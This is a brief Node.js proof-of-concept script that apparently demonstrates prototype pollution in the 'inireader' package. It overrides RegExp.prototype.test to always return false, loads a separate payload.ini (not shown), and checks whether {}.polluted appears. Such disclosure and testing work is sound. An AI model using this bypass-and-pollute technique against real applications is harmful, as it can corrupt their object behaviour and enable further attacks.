RegExp.prototype.test = () => false;
const iniReader = require('inireader');
const path = require('path');
const parser = new iniReader.IniReader();
let obj = {};
console.log({}.polluted);
parser.load(path.resolve(__dirname, './payload.ini'));
console.log({}.polluted);